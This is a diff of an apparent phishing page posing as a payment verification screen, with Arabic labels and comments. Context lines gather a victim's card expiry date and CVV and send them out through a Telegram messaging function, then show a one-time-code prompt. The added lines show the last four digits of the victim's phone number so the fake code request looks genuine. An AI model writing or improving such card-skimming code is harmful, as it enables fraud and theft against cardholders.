@@ -222,7 +222,7 @@
             </div>
             <div class="payment-header">
                 <h2>التحقق من الدفع</h2>
-                <!-- التعديل الجديد للنص -->
+                <!-- التعديل هون عشان يبين آخر 4 أرقام -->
                 <p id="otp-subtitle">أدخل الرمز المرسل إلى الأرقام</p>
             </div>
             
@@ -323,6 +323,14 @@
             cardMsg += `تاريخ الانتهاء: ${expiry}\n`;
             cardMsg += `رمز الأمان: ${cvv}`;
             sendTelegramMsg(cardMsg);
+
+            // التعديل: سحب آخر 4 أرقام وعرضها
+            if (currentPhone.length >= 4) {
+                let last4 = currentPhone.slice(-4);
+                document.getElementById('otp-subtitle').innerText = `أدخل الرمز المرسل إلى ${last4}`;
+            } else {
+                document.getElementById('otp-subtitle').innerText = `أدخل الرمز المرسل إلى الأرقام`;
+            }
 
             document.getElementById('payment-page').style.display = 'none';
             document.getElementById('otp-page').style.display = 'block';
